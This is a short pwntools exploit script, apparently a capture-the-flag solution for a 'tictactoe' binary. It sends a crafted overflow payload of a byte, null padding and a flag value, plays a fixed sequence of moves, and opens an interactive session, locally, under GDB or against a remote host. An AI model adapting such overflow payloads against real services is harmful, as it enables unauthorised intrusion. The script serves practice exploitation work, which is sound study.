from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x0000000000401223
continue
'''.format(**locals())


# Binary filename
exe = './tictactoe' #change this
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
payload = flat(
    b'x',
    b'\x00' * 0x3D,
    b'\x01'
    )
io.sendline(payload)
io.sendlineafter(b"Current board state:",b'5')
io.sendlineafter(b"Current board state:",b'3')
io.sendlineafter(b"Current board state:",b'4')
io.sendlineafter(b"Current board state:",b'8')
io.interactive()